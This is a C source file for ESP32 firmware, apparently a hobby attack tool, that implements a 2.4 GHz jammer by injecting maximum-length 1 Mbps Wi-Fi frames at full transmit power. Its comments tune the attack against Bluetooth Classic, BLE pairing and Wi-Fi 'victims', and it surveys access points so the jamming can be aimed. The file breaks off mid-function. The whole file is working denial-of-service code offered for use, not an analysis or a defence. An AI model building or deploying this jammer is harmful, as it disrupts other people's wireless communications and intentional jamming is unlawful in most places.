#include "svc_wicoll.h"
#include "svc_wifi.h"
#include "svc_sniff.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "wicoll";

/* ---- Constants, with provenance ------------------------------------
 * FRAME LENGTH: 2346 B is aMaxFrameSize, the documented ceiling for
 * esp_wifi_80211_tx(). Duty scales with frame length because the TX buffer
 * is frame-COUNT limited. At 1 Mbps long preamble one frame occupies ~18.9
 * ms, longer than a Bluetooth DH5 packet (6.25 ms), so any BT packet
 * starting inside it cannot complete.
 * MAX TX POWER: esp_wifi_set_max_tx_power unit is 0.25 dBm, so 78 = 19.5
 * dBm. See the header - CALLING set_max_tx_power(78) REDUCES the power on
 * this driver, so apply_tx_power() reads first and writes only if low.
 * DRAIN / SETTLE / TIMEOUT are all measured on this board. */
#define WICOL_MAX_TXPOWER 78
#define WICOL_FRAME_LEN   2346
#define WICOL_DRAIN_US    1000   /* wait after the buffer refuses a frame  */
#define WICOL_SETTLE_US  5500   /* esp_wifi_set_channel, measured 5.4-5.9 */
#define WICOL_TIMEOUT_S   180
#define WICOL_YIELD_US    500000 /* TX task yields every 500 ms: ~2% duty */

/* Airtime of one 802.11b long-preamble DSSS frame at 1 Mbps, which is what
 * wicoll_start() forces:
 *   PLCP preamble  72 chips / 11 Mchip/s =  6.545 us
 *   SFD           16 chips / 11 Mchip/s =  1.455 us
 *   PLCP header  64 bits  @ 1 Mbps     = 64     us
 *   PSDU         len bytes @ 1 bit/us   = len*8  us
 *   SIFS + DIFS                         = 44     us
 * One expression covers both bandwidth settings, deliberately: 1 Mbps DSSS
 * is defined only for 20 MHz, so even an "HT40" slot carries a legacy 20 MHz
 * frame. The model follows the frame that leaves the air, not the bandwidth
 * that was requested - exactly the distinction the previous constant lost
 * when it hardcoded 1492 us while nothing forced the radio to 1 Mbps. */
#define WICOL_LEGACY_PRE_US 72
#define WICOL_IFS_US       44

/* esp_wifi_80211_tx() reports a full TX buffer with this code. Not declared
 * in any public IDF header (checked esp_wifi.h and esp_err.h) so it is
 * matched numerically - the probe observed 0x101 directly. */
#define WICOL_ENOMEM ((esp_err_t)257)

#define WICOL_CH_MIN 1
#define WICOL_CH_MAX 14

/* Channel plans. WiFi channels are 5 MHz apart with 22 MHz occupied width,
 * so they tile rather than stack.
 *
 * TILE: ch1 2401-2423, ch5 2421-2443, ch9 2441-2463, ch13 2461-2483.
 * Their union is 2401-2483 continuous, which contains the receive span of
 * every WiFi channel 1-13 and every Bluetooth channel 0-78. Four slots put
 * 25% of the airtime on any given channel; sweeping all thirteen would put
 * 7.7% on each and is strictly worse for a receiver integrating over its
 * packet. ALL exists anyway for the cases tiling misses: channel 14 (the
 * JP model at 2484, whose span reaches 2495) and non-standard channel plans.
 *
 * BLE advertising channels sit at 2402 (37), 2426 (38) and 2480 (39). 37 and
 * 38 both fall inside a 40 MHz slot at ch1; 39 needs ch9. That is why
 * DISCOVER is asymmetric: even time gives 50% loss on all three, which only
 * slows pairing, while 90/10 gives ~90/90/10 - concentrated loss, which
 * stops it. */
static const uint8_t C_1_9[]      = { 1, 9 };
static const uint8_t C_1_5_9_13[] = { 1, 5, 9, 13 };
static const uint8_t C_1_5_13[]   = { 1, 5, 13 };
static const uint8_t C_ALL[]      = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 };

/* Dwell presets, chosen per profile for a reason.
 *   Bluetooth: dwell decides whether AFH can escape. Blacklisting takes
 *     under 5 s and re-inclusion is slower, so a long dwell gives the
 *     controller a solid burst to blacklist and too short a gap to call it
 *     recovered. 1000 ms.
 *   WiFi: there is nothing to out-run. Dwell is purely sweep speed against
 *     settle loss, and settle is 5.5 ms per switch, so 100 ms costs 5.2%
 *     and 50 ms costs 9.9%. Short is right for a different reason than it
 *     is right for Bluetooth. */
static const uint16_t D_250x2[]   = { 250, 250 };
static const uint16_t D_250x4[]   = { 250, 250, 250, 250 };
static const uint16_t D_100x4[]   = { 100, 100, 100, 100 };
static const uint16_t D_40x4[]    = { 40, 40, 40, 40 };

/* BURST: long hard burst per channel, then a deliberate quiet gap. The gap is
 * the whole point - see the header on WICOL_MODE_BURST. 400 on / 150 off
 * over four slots = 73% duty, and each channel takes a 400 ms hit every
 * 2.2 s instead of a constant 25%. */
static const uint16_t D_BURST[]   = { 400, 400, 400, 400 };
static const uint16_t D_ADV40[]   = { 900, 100 };
static const uint16_t D_ADV20[]   = { 450, 45, 45 };
/* ALL at 40 ms, not 25. Thirteen switches at 5.5 ms settle is 71.5 ms dead,
 * which at 25 ms dwell is 18% of the cycle; at 40 ms it falls to ~13%. */
static const uint16_t D_40x13[]   = {
    40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40
};

/* SWEEP cycles these. Each value holds for a full band sweep, not one slot,
 * so every step gets a clean run to be judged against a real victim. */
static const uint16_t D_SWEEP[]   = { 50, 250, 1000, 5000 };

/* HOT: survey-weighted dwell. Every slot keeps a floor so channel-hopping
 * still gets punished; the surplus is distributed by AP density. Sweep time
 * is the sum of these. */
#define HOT_FLOOR_MS   50
#define HOT_SWEEP_MS   400
#define HOT_MAX_SLOTS  13

/* Per-channel listen time for the pre-run survey. Same budget HOT uses: short
 * enough that arming does not feel broken, long enough that an AP beaconing
 * at the 100 TU minimum is caught. An access point emits a beacon every
 * 102.4 ms, so 250 ms cannot miss a live one by more than one frame. */
#define WICOL_SURVEY_MS 250

/* Duration/ID written into the frame header, high byte first.
 *
 * MEASURED, AND IT DID NOT MATTER. Setting the maximum virtual-carrier-sense
 * duration (32767 us, bit15 clear so a legacy receiver takes it as a plain
 * duration) is the obviously-correct-looking value: it tells every station
 * that hears the header to defer for 32 ms, and our own frames repeat every
 * ~19 ms, so the medium should never look idle. A/B'd on a victim's own link
 * at 60 cm, three paired 15 s windows each, same aim, same session:
 *
 *   Duration = 32767:  p50 124 / 146 / 140 ms   pooled 3.54x, 3.8% loss
 *   Duration =     0:  p50 103 / 160 /  87 ms   pooled 2.73x, 1.9% loss
 *
 * The pooled medians differ by 30%, which looks like a result. It is not one:
 * the spread WITHIN a single build is 87-160 ms, so the two distributions
 * overlap almost completely and three windows cannot separate them. Treat
 * this as "no difference detected", not as "max NAV is better".
 *
 * What it does establish is the MECHANISM. A decoded frame imposing a 32 ms
 * NAV would be a protocol-level denial that works at almost any power, and it
 * would be distance-insensitive. We do not see that, so the degradation on
 * this victim is raw energy on the channel, not a carrier-sense gesture -
 * which is the same conclusion the 10 cm vs 60 cm equality points to.
 *
 * Kept at zero, i.e. the pre-existing default. The maximum was measured to
 * buy nothing distinguishable from noise, and a change that cannot be shown
 * to help is one more difference from the known baseline. */
#ifndef WICOL_DURATION_LO
#define WICOL_DURATION_LO 0x00
#define WICOL_DURATION_HI 0x00
#endif

typedef struct {
    const uint8_t *ch;
    uint8_t nch;
    const uint16_t *dwell; /* NULL for HOT and SWEEP */
    uint8_t lock;          /* 1 = park on the pinned channel all run   */
    uint16_t gap_ms;       /* quiet gap after each dwell; BURST only    */
} wicol_cfg_t;

#define BURST_GAP_MS 150

/* [profile][mode]. Entries the profile does not expose are unreachable -
 * wicoll_mode_count() stops the UI before it can select one. */
static const wicol_cfg_t CFG[WICOL_PROFILE_COUNT][WICOL_MODE_MAX] = {
    /* --- BLE --- */
    {
        { C_1_9,      2, D_250x2,  0, 0 },       /* FULL     */
        { C_1_5_9_13, 4, NULL,     0, 0 },       /* HOT      */
        { C_1_5_9_13, 4, D_BURST,  0, 150 },     /* BURST    */
        { NULL,       1, NULL,     1, 0 },       /* LOCK     */
        { C_1_9,      2, D_ADV40,  0, 0 },       /* DISCOVER */
        { NULL,       0, NULL,     0, 0 },       /* ALL      */
        { C_1_5_9_13, 4, NULL,     0, 0 },       /* SWEEP    */
    },
    /* --- CLASSIC --- */
    {
        { C_1_5_9_13, 4, D_250x4,  0, 0 },
        { C_1_5_9_13, 4, NULL,     0, 0 },
        { C_1_5_9_13, 4, D_BURST,  0, 150 },
        { NULL,       1, NULL,     1, 0 },
        { C_1_5_9_13, 4, D_40x4,   0, 0 },
        { NULL,       0, NULL,     0, 0 },
        { C_1_5_9_13, 4, NULL,     0, 0 },
    },
    /* --- WIFI --- */
    {
        { C_1_5_9_13, 4, D_100x4,  0, 0 },
        { C_1_5_9_13, 4, NULL,     0, 0 },
        { C_1_5_9_13, 4, D_BURST,  0, 150 },
        { NULL,       1, NULL,     1, 0 },
        { NULL,       0, NULL,     0, 0 },
        { C_ALL,      13, D_40x13, 0, 0 },
        { C_ALL,      13, NULL,    0, 0 },
    },
};

/* 20 MHz plans. Two 22 MHz slots cannot cover the band, so the plan widens
 * rather than leaving a hole when bw40 is off. */
static const wicol_cfg_t CFG20[WICOL_PROFILE_COUNT][WICOL_MODE_MAX] = {
    {
        { C_1_5_9_13, 4, D_250x4,  0, 0 },
        { C_1_5_9_13, 4, NULL,     0, 0 },
        { C_1_5_9_13, 4, D_BURST,  0, 150 },
        { NULL,       1, NULL,     1, 0 },
        { C_1_5_13,   3, D_ADV20,  0, 0 },
        { C_ALL,      13, D_40x13, 0, 0 },
        { C_ALL,      13, NULL,    0, 0 },
    },
    {
        { C_1_5_9_13, 4, D_250x4,  0, 0 },
        { C_1_5_9_13, 4, NULL,     0, 0 },
        { C_1_5_9_13, 4, D_BURST,  0, 150 },
        { NULL,       1, NULL,     1, 0 },
        { C_1_5_9_13, 4, D_40x4,   0, 0 },
        { C_ALL,      13, D_40x13, 0, 0 },
        { C_ALL,      13, NULL,    0, 0 },
    },
    {
        { C_1_5_9_13, 4, D_100x4,  0, 0 },
        { C_1_5_9_13, 4, NULL,     0, 0 },
        { C_1_5_9_13, 4, D_BURST,  0, 150 },
        { NULL,       1, NULL,     1, 0 },
        { NULL,       0, NULL,     0, 0 },
        { C_ALL,      13, D_40x13, 0, 0 },
        { C_ALL,      13, NULL,    0, 0 },
    },
};

/* Modes each profile offers, terminated by WICOL_MODE_MAX. */
static const wicol_mode_t MODES[WICOL_PROFILE_COUNT][WICOL_MODE_MAX] = {
    { WICOL_MODE_FULL, WICOL_MODE_HOT, WICOL_MODE_BURST, WICOL_MODE_LOCK,
      WICOL_MODE_DISCOVER, WICOL_MODE_SWEEP, WICOL_MODE_MAX },
    { WICOL_MODE_FULL, WICOL_MODE_HOT, WICOL_MODE_BURST, WICOL_MODE_LOCK,
      WICOL_MODE_DISCOVER, WICOL_MODE_SWEEP, WICOL_MODE_MAX },
    { WICOL_MODE_FULL, WICOL_MODE_HOT, WICOL_MODE_BURST, WICOL_MODE_LOCK,
      WICOL_MODE_ALL, WICOL_MODE_SWEEP, WICOL_MODE_MAX },
};

static const char *MODE_NAME[WICOL_MODE_MAX] = {
    "Full", "Hot", "Burst", "Lock", "Discover", "All", "Sweep"
};

typedef struct {
    TaskHandle_t task;
    volatile uint32_t frames;
    volatile uint32_t win_frames;
    volatile uint32_t fps;
    volatile int tx_err;
    volatile int expired;
    volatile uint8_t channel;
    int64_t win_us;
    int64_t started_us;
    int64_t last_yield_us;
    wicol_mode_t mode;
    wicol_profile_t profile;
    int bw40;
    int sweep_i;
    uint8_t pinned_ch;
    int tx_power;         /* driver readback, 0.25 dBm units; -1 unknown */
    uint16_t hot_dwell[HOT_MAX_SLOTS];
    uint8_t hot_lock_ch;  /* 0 until a survey picks one */
    uint16_t hot_dwell_total;
    uint8_t lock_ch;      /* LOCK's surveyed aim; 0 = fall back to pinned */
    uint8_t lock_ap_ch;   /* how many channels showed an actual beacon */
} wicoll_t;

static wicoll_t s;

/* Static, not heap: the TX loop must never allocate while the radio is up. */
static uint8_t s_frame[WICOL_FRAME_LEN];

/* Minimal valid 802.11 non-QoS data frame, broadcast DA so nothing expects
 * an ACK and no backoff-for-reply path is taken. The payload is filler:
 * only the airtime the frame occupies matters, not its contents. */
static void build_frame(void) {
    memset(s_frame, 0, sizeof(s_frame));
    s_frame[0] = 0x08;              /* FC: data frame, no QoS */
    s_frame[1] = 0x00;
    s_frame[2] = WICOL_DURATION_LO;   /* Duration/ID -> NAV for the victim */
    s_frame[3] = WICOL_DURATION_HI;
    memset(s_frame + 4, 0xff, 6);   /* addr1 broadcast */
    memset(s_frame + 10, 0x11, 6);  /* addr2 */
    memset(s_frame + 16, 0x22, 6);  /* addr3 */
    s_frame[22] = 0x00;             /* sequence control */
    s_frame[23] = 0x00;
    for (int i = 24; i < WICOL_FRAME_LEN; i++) {
        s_frame[i] = (uint8_t)i;
    }
}

static uint32_t frame_airtime_us(void) {
    return (uint32_t)WICOL_LEGACY_PRE_US +
           (uint32_t)WICOL_FRAME_LEN * 8u +
           (uint32_t)WICOL_IFS_US;
}

static const wicol_cfg_t *cfg_for(void) {
    const wicol_cfg_t (*t)[WICOL_MODE_MAX] = s.bw40 ? CFG : CFG20;
    return &t[s.profile][s.mode];
}

/* Select the profile WITHOUT starting. The UI must call this whenever the
 * target changes, because wicoll_mode_count() / wicoll_mode_at() read the
 * profile held HERE and not the one the UI picked - see wicoll_start(). */
void wicoll_set_profile(wicol_profile_t p) {
    if (p < 0 || p >= WICOL_PROFILE_COUNT) {
        return;
    }
    if (s.task) {
        return; /* never change under a running attack */
    }
    s.profile = p;
}

int wicoll_mode_count(void) {
    int n = 0;
    while (n < WICOL_MODE_MAX &&
           MODES[s.profile][n] != WICOL_MODE_MAX) {
        n++;
    }
    return n;
}

wicol_mode_t wicoll_mode_at(int idx) {
    int n = wicoll_mode_count();
    if (idx < 0 || idx >= n) {
        return WICOL_MODE_FULL;
    }
    return MODES[s.profile][idx];
}

const char *wicoll_mode_name(wicol_mode_t m) {
    if (m < 0 || m >= WICOL_MODE_MAX) {
        return "?";
    }
    return MODE_NAME[m];
}

const char *wicoll_profile_name(wicol_profile_t p) {
    switch (p) {
    case WICOL_PROFILE_BLE: return "BLE";
    case WICOL_PROFILE_CLASSIC: return "Classic";
    case WICOL_PROFILE_WIFI: return "WiFi";
    default: return "?";
    }
}

/* Apply max power, then read back what the driver actually stored.
 *
 * CRITICAL, and the reason this function looks the way it does: on this
 * driver, CALLING esp_wifi_set_max_tx_power(78) is itself what reduces the
 * power. Left alone the driver reports 78 (19.5 dBm) at every PHY rate;
 * immediately after writing 78 it reports back 58-59 (14.7 dBm). Two hours
 * were spent chasing a "module clamp" and a "regulatory country clamp" that
 * did not exist. So: read first, and only write when genuinely below target.
 */
static int apply_tx_power(void) {
    int8_t p = 0;

    if (esp_wifi_get_max_tx_power(&p) != ESP_OK) {
        return -1;
    }
    if (p >= WICOL_MAX_TXPOWER) {
        return (int)p; /* already at the ceiling; do not touch it */
    }
    esp_wifi_set_max_tx_power(WICOL_MAX_TXPOWER);
    if (esp_wifi_get_max_tx_power(&p) != ESP_OK) {
        return -1;
    }
    if (p < WICOL_MAX_TXPOWER) {
        ESP_LOGW(TAG, "tx power clamped to %d (%.1f dBm)", (int)p,
                 (float)p / 4.0f);
    }
    return (int)p;
}

/* Pick the single channel LOCK should sit on, and count how many channels
 * actually carry an access point.
 *
 * LOCK previously did no aiming of its own: it took s.pinned_ch, which is 1
 * unless something else set it. So the mode that is SUPPOSED to be the
 * precise one was the one that silently attacked a fixed channel - measured
 * failing whenever the AP was not on channel 1, which is most of the time.
 * It now surveys like HOT does.
 *
 * A candidate is a channel that carried at least one BEACON. Beacons are the
 * only proof an AP is present; a burst of data can appear on a channel whose
 * AP is elsewhere (traffic from a neighbouring BSS whose frames happen to
 * land there, or a survey that straddles a set_channel). Ranking on total
 * frames then picks the busiest real AP, which is the one whose link a victim
 * is most likely sitting on.
 *
 * The beacon filter matters more than it looks: without it a single data
 * spike outranks the victim's channel and the run parks somewhere empty for
 * the full timeout, which is exactly the failure LOCK exists to prevent. */
static void run_lock_survey(void) {
    sniff_survey_t sv;
    int best = -1;
    uint32_t best_total = 0;
    int candidates = 0;

    s.lock_ch = 0;
    s.lock_ap_ch = 0;

    if (svc_sniff_survey(WICOL_SURVEY_MS, &sv) < 0 || sv.n <= 0) {
        /* Keep the pinned-channel behaviour: an aimless attack still beats
         * refusing to start. */
        ESP_LOGW(TAG, "lock survey failed, parking on ch%u", s.pinned_ch);
        return;
    }

    for (int i = 0; i < sv.n; i++) {
        if (sv.ch[i].beacons == 0) {
            continue;
        }
        candidates++;
        if (best < 0 || sv.ch[i].total > best_total) {
            best = sv.ch[i].channel;
            best_total = sv.ch[i].total;
        }
    }
    s.lock_ap_ch = (uint8_t)(candidates > 255 ? 255 : candidates);
    if (best >= 1 && best <= WICOL_CH_MAX) {
        s.lock_ch = (uint8_t)best;
    }
    ESP_LOGI(TAG, "lock survey: aim ch%u, %d ap channels, %u frames",
             s.lock_ch, candidates, (unsigned)best_total);
}

/* Survey the band, then hand out dwell proportional to where the APs are.
 *
 * The point is NOT to lock onto the victim. Pure targeting is worse than a
 * uniform sweep here, because an AP under interference simply moves channel
 * and the jammer is left hammering an empty band. So every slot keeps a
 * floor and hopping still gets punished - this concentrates airtime without
 * giving up the defence against movement.
 *
 * Weighted by DISTINCT AP COUNT rather than raw frame count: one chatty AP
 * dominates a frame histogram and is exactly the wrong thing to optimise
 * for. Survey runs once at launch and is then frozen - one radio cannot
 * listen and transmit at the same time, so any rescan during the attack
 * would cost airtime to learn nothing new. */
static void run_hot_survey(void) {
    sniff_survey_t sv;
    const wicol_cfg_t *c = cfg_for();
    uint32_t aps[HOT_MAX_SLOTS];
    uint32_t total = 0;
    int slots = c->nch;

    for (int i = 0; i < HOT_MAX_SLOTS; i++) {
        aps[i] = 0;
        s.hot_dwell[i] = HOT_FLOOR_MS;
    }
    s.hot_lock_ch = 0;
    s.hot_dwell_total = 0;
    if (slots <= 0 || slots > HOT_MAX_SLOTS) {
        return;
    }

    if (svc_sniff_survey(250, &sv) < 0 || sv.n <= 0) {
        /* Survey failed. Fall back to a uniform sweep rather than refusing
         * to start: a flat profile is still an attack. */
        ESP_LOGW(TAG, "hot survey failed, using uniform dwell");
        for (int i = 0; i < slots; i++) {
            aps[i] = 1;
            total += 1;
        }
    } else {
        /* Fold each surveyed channel into the slot whose 22 MHz span contains
         * it, so a 1..13 survey feeds a 4-slot tiled plan directly. */
        for (int i = 0; i < sv.n; i++) {
            int ch = sv.ch[i].channel;
            int centre = 2412 + 5 * (ch - 1);
            for (int k = 0; k < slots; k++) {
                int slot_centre = 2412 + 5 * (c->ch[k] - 1);
                if (abs(centre - slot_centre) <= 11) {
                    aps[k] += sv.ch[i].aps;
                    total += sv.ch[i].aps;
                }
            }
        }
        s.hot_lock_ch = (sv.loudest >= 1 && sv.loudest <= WICOL_CH_MAX)
                        ? (uint8_t)sv.loudest : 0;
    }

    if (total == 0) {
        for (int i = 0; i < slots; i++) {
            aps[i] = 1;
            total += 1;
        }
    }

    uint32_t surplus;
    /* Signed on purpose. HOT_FLOOR_MS * slots exceeds HOT_SWEEP_MS once a
     * mode carries more than 8 slots, and computing the surplus in uint32_t
     * would wrap to ~4 billion rather than clamp to zero. */
    int surplus_s = (int)HOT_SWEEP_MS - (int)(HOT_FLOOR_MS * slots);
    surplus = surplus_s > 0 ? (uint32_t)surplus_s : 0;
    uint32_t handed = 0;
    for (int i = 0; i < slots; i++) {
        s.hot_dwell[i] = (uint16_t)(HOT_FLOOR_MS +
                                    (surplus * aps[i]) / total);
        handed += s.hot_dwell[i];
    }
    /* Give the rounding remainder to the busiest slot so the sweep really
     * does last HOT_SWEEP_MS rather than drifting a little under. */
    if (handed < (uint32_t)HOT_SWEEP_MS && slots > 0) {
        uint32_t best = 0;
        for (int i = 1; i < slots; i++) {
            if (aps[i] > aps[best]) {
                best = (uint32_t)i;
            }
        }
        s.hot_dwell[best] += (uint16_t)((uint32_t)HOT_SWEEP_MS - handed);
    }
    s.hot_dwell_total = (uint16_t)HOT_SWEEP_MS;

    ESP_LOGI(TAG, "hot survey: lock ch%u, sweep %u ms", s.hot_lock_ch,
             s.hot_dwell_total);
}

/* One pass on a channel: set it, let it settle, then fill-and-drain until
 * the dwell expires or the run times out.
 *
 * The drain is the whole trick: a tight loop is refused ~95% of the time
 * and transmits almost nothing, whereas draining on refusal keeps the driver
 * saturated at whatever rate it can actually sustain. */
static void run_dwell(uint8_t ch, int dwell_ms) {
    /* Power is re-applied from inside the task on every dwell. One driver
     * call per switch is nothing, and it is the only place guaranteed to be
     * the last thing to touch the PHY before the next burst goes out. */
    s.tx_power = apply_tx_power();

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    s.channel = ch;
    esp_rom_delay_us(WICOL_SETTLE_US);

    int64_t deadline = esp_timer_get_time() + (int64_t)dwell_ms * 1000;
    int64_t stop_at = s.started_us + (int64_t)WICOL_TIMEOUT_S * 1000000LL;

    while (esp_timer_get_time() < deadline) {
        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, s_frame,
                                        WICOL_FRAME_LEN, false);
        if (r == ESP_OK) {
            s.frames++;
            /* Yield on a CLOCK, not a frame count. The old rule was every
             * 64 frames, tuned when the loop ran at ~565 fps - 113 ms then.
             * Now it runs at ~54 fps, so the same 64 frames became 1.19 s of
             * uninterrupted hammering that starved the UI. Time-bounded so
             * it cannot drift with the frame rate again. */
            int64_t now = esp_timer_get_time();
            if (now - s.last_yield_us >= WICOL_YIELD_US) {
                s.last_yield_us = now;
                vTaskDelay(1);
            }
        } else if (r == WICOL_ENOMEM) {
            /* Buffer full: this is the watermark, not a failure. */
            esp_rom_delay_us(WICOL_DRAIN_US);
        } else {
            if (!s.tx_err) {
                s.tx_err = (int)r;
            }
            esp_rom_delay_us(WICOL_DRAIN_US);
        }
        /* Timeout is checked inside the dwell, not only between dwells:
         * LOCK parks on one channel for the whole run and would otherwise
         * exit without ever raising the flag the owner polls. */
        if (esp_timer_get_time() >= stop_at) {
            s.expired = 1;
            return;
        }
    }
}

static void tx_task(void *arg) {
    (void)arg;
    const wicol_cfg_t *c = cfg_for();
    int idx = 0;

    s.last_yield_us = esp_timer_get_time();

    if (c->lock) {
        /* Aimed channel first, then HOT's aim if this run somehow inherited
         * one, and only then the pinned channel. */
        uint8_t park = s.pinned_ch;
        if (s.hot_lock_ch > 0) {
            park = s.hot_lock_ch;
        }
        if (s.lock_ch > 0) {
            park = s.lock_ch;
        }
        run_dwell(park, WICOL_TIMEOUT_S * 1000);
        s.task = NULL;
        vTaskDelete(NULL);
        return;
    }

    for (;;) {
        int dwell;
        if (s.mode == WICOL_MODE_HOT) {
            dwell = s.hot_dwell[idx];
        } else if (c->dwell) {
            dwell = c->dwell[idx];
        } else {
            dwell = D_SWEEP[s.sweep_i];
        }
        run_dwell(c->ch[idx], dwell);

        /* BURST's gap is the mode. Long hard burst, then deliberate silence
         * so the victim's rate control re-optimises and commits to a high
         * MCS before the next burst lands. Kept after the expired check so
         * a stop does not sit in a gap. */
        if (c->gap_ms > 0 && !s.expired) {
            int64_t gap_until = esp_timer_get_time() +
                                (int64_t)c->gap_ms * 1000;
            while (esp_timer_get_time() < gap_until) {
                if (esp_timer_get_time() >= s.started_us +
                    (int64_t)WICOL_TIMEOUT_S * 1000000LL) {
                    s.expired = 1;
                    break;
                }
                vTaskDelay(pdMS_TO_TICKS(20));
            }
        }
        if (s.expired) {
            break;
        }
        idx++;
        if (idx >= c->nch) {
            idx = 0;
            /* Advance the dwell step only after a FULL sweep of every
             * channel. Advancing per-slot rotated the values against each
             * other so none ever got a clean run to judge. */
            if (!c->dwell && s.mode != WICOL_MODE_HOT) {
                s.sweep_i++;
                if (s.sweep_i >= (int)(sizeof(D_SWEEP) / sizeof(D_SWEEP[0]))) {
                    s.sweep_i = 0;
                }
            }
        }
    }

    /* Reached on timeout. The task must never wait on its own completion. */
    s.task = NULL;
    vTaskDelete(NULL);
}

int wicoll_start(wicol_profile_t profile, wicol_mode_t mode) {
    if (s.task) {
        return 0;
    }
    if (mode < 0 || mode >= WICOL_MODE_MAX) {
        return -4;
    }
    if (profile < 0 || profile >= WICOL_PROFILE_COUNT) {
        return -5;
    }
    /* REFUSE a mode this profile does not expose.
     *
     * This is not paranoia, it is a crash that was measured. The UI tracks
     * the selected profile locally while this module tracks its own, and
     * wicoll_mode_at() - which the UI uses to turn a row into a mode -
     * reads THIS one. So selecting WiFi in the UI before ever running a WiFi
     * attack left the service on BLE: row 4 resolved to DISCOVER, and
     * wicoll_start(WIFI, DISCOVER) looked up CFG[WiFi][DISCOVER], which is
     * {NULL, 0, NULL} - no channel list, no dwell, and lock clear. tx_task
     * fell through to the sweep branch and then dereferenced c->ch[0]:
     * Guru Meditation, LoadProhibited, Core 0.
     *
     * wicoll_set_profile() removes the desync; this check makes any future
     * one harmless instead of fatal. */
    {
        int n = 0;
        int ok = 0;
        while (n < WICOL_MODE_MAX && MODES[profile][n] != WICOL_MODE_MAX) {
            if (MODES[profile][n] == mode) {
                ok = 1;
                break;
            }
            n++;
        }
        if (!ok) {
            ESP_LOGE(TAG, "mode %d not offered by %s", (int)mode,
                     wicoll_profile_name(profile));
            return -8;
        }
    }
    s.mode = mode;
    s.profile = profile;
    s.frames = 0;
    s.win_frames = 0;
    s.fps = 0;
    s.tx_err = 0;
    s.expired = 0;
    s.sweep_i = 0;
    s.channel = s.pinned_ch;
    s.started_us = 0;
    s.tx_power = -1;
    s.hot_lock_ch = 0;
    s.lock_ch = 0;
    s.lock_ap_ch = 0;

    if (svc_wifi_init() != 0) {
        return -1;
    }

    /* Bandwidth and rate must be applied after the driver is up and before
     * the first frame. Forcing 1 Mbps is what makes the airtime model true
     * instead of assumed; at a higher rate the frame is roughly 25x shorter
     * and the duty figure would be fiction again. */
    if (s.bw40) {
        esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT40);
    } else {
        esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT20);
    }
    esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);
    s.tx_power = apply_tx_power();

    build_frame();

    /* VERIFY BEFORE REPORTING RUNNING. A tight loop against a driver that
     * never came up returns an error every call while still spinning fast
     * enough to look healthy, and the duty figure computed from it is
     * fiction. Probe runs produced exactly that. */
    esp_err_t v = esp_wifi_80211_tx(WIFI_IF_STA, s_frame, WICOL_FRAME_LEN, false);
    if (v != ESP_OK) {
        ESP_LOGE(TAG, "frame verify failed (%d), not starting", (int)v);
        /* A rejected length is a distinct failure from a dead radio: it
         * means the frame is too long, not that nothing is transmitting. */
        return (v == ESP_ERR_INVALID_ARG) ? -6 : -2;
    }

    /* HOT and LOCK survey before the task starts. They need the promiscuous
     * receiver, which the TX loop then takes over, so it cannot run
     * afterwards. LOCK is here because parking on a guessed channel is the
     * one thing a "lock" mode must never do. */
    if (mode == WICOL_MODE_HOT) {
        run_hot_survey();
    } else if (mode == WICOL_MODE_LOCK) {
        run_lock_survey();
    }

    s.frames = 0; /* discard the probe frame so the counter is honest */
    s.started_us = esp_timer_get_time();
    s.win_us = s.started_us;

    BaseType_t r = xTaskCreatePinnedToCore(tx_task, "wicoll_tx", 4096, NULL,
                                           5, &s.task, 0);
    if (r != pdPASS || !s.task) {
        s.task = NULL;
        return -3;
    }
    ESP_LOGI(TAG, "running %s/%s bw=%s",
             wicoll_profile_name(profile), wicoll_mode_name(mode),
             s.bw40 ? "HT40" : "HT20");
    return 0;
}

void wicoll_stop(void) {
    if (s.task) {
        eTaskState st = eTaskGetState(s.task);
        if (st == eRunning || st == eReady || st == eBlocked) {
            vTaskDelete(s.task);
        }
        s.task = NULL;
    }
    ESP_LOGI(TAG, "stopped, %lu frames", (unsigned long)s.frames);
}

int wicoll_running(void) {
    return s.task != NULL;
}

wicol_mode_t wicoll_mode(void) {
    return s.mode;
}

wicol_profile_t wicoll_profile(void) {
    return s.profile;
}

uint32_t wicoll_frames(void) {
    return s.frames;
}

uint32_t wicoll_fps(void) {
    int64_t now = esp_timer_get_time();
    int64_t el = now - s.win_us;
    if (el >= 1000000) {
        s.fps = (uint32_t)(((uint64_t)(s.frames - s.win_frames) * 1000000ULL) /
                           (uint64_t)el);
        s.win_frames = s.frames;
        s.win_us = now;
    }
    return s.fps;
}

uint32_t wicoll_airtime_us(void) {
    return frame_airtime_us();
}

uint32_t wicoll_duty_permille(void) {
    /* DERIVED: frames x airtime, not measured occupancy. Caller labels it. */
    int64_t elapsed = esp_timer_get_time() - s.started_us;
    if (elapsed <= 0) {
        return 0;
    }
    uint64_t us = (uint64_t)s.frames * (uint64_t)frame_airtime_us();
    uint64_t permille = us * 1000ULL / (uint64_t)elapsed;
    if (permille > 0xFFFFFFFFULL) {
        permille = 0xFFFFFFFFULL;
    }
    return (uint32_t)permille;
}

uint32_t wicoll_elapsed_s(void) {
    if (s.started_us == 0) {
        return 0;
    }
    return (uint32_t)((esp_timer_get_time() - s.started_us) / 1000000);
}

uint32_t wicoll_remaining_s(void) {
    if (!s.task || s.expired) {
        return 0;
    }
    uint32_t e = wicoll_elapsed_s();
    return e >= WICOL_TIMEOUT_S ? 0 : (WICOL_TIMEOUT_S - e);
}

int wicoll_expired(void) {
    return s.expired;
}

int wicoll_tx_error(void) {
    return s.tx_err;
}

uint8_t wicoll_channel(void) {
    return s.channel;
}

int wicoll_tx_power_raw(void) {
    /* Prefer the value captured at start, where the driver was up and the
     * power had just been written. 0 is treated as "never set": the struct
     * is zero-initialised, so before the first run s.tx_power is 0 and a
     * plain >= 0 test would report a confident 0.0 dBm for a radio that has
     * never transmitted anything. */
    if (s.tx_power > 0) {
        return s.tx_power;
    }
    int8_t p = 0;
    if (esp_wifi_get_max_tx_power(&p) != ESP_OK || p <= 0) {
        return -1;
    }
    return (int)p;
}

void wicoll_set_bw40(int on) {
